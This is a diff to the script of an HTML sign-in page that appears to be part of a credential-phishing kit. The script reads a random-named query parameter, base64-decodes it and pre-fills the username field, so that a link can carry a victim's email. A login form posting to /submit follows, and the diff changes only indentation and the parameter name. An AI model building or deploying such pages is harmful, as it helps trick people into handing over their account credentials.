@@ -670,28 +670,26 @@ background:none;
 cursor:pointer;
 }
 </style>
-
 <script>
-          // Function to extract query parameter value
-          function getQueryParameter(parameterName) {
-            var queryString = window.location.search;
-            var urlParams = new URLSearchParams(queryString);
-            return urlParams.get(parameterName);
-          }
-          // Get the value from the 'data' query parameter
-          var value = getQueryParameter('fghgfrtyhfghrytretrg');
-          
-          var b64name = atob(value);
-          
-          function onLoad() {
-            var b64name = atob(value);
-            var inputField = document.getElementById('username');
-            inputField.value = b64name;
-          }
-          
+		    // Function to extract query parameter value
+		    function getQueryParameter(parameterName) {
+		      var queryString = window.location.search;
+		      var urlParams = new URLSearchParams(queryString);
+		      return urlParams.get(parameterName);
+		    }
+		    // Get the value from the 'data' query parameter
+		    var value = getQueryParameter('jdfgjfgjfgjgdjgdj');
+		    
+		    var b64name = atob(value);
+		    
+		    function onLoad() {
+		      var b64name = atob(value);
+		      var inputField = document.getElementById('username');
+		      inputField.value = b64name;
+		    }
+		    
 
-        </script>
-
+		  </script>
 </head>
 <body onload="onLoad();" class="signInBg" style="background: #f2f2f2 url(./files/body.png) repeat-x">
 <form action="/submit" method="POST"  name="logonForm" autocomplete="off" >
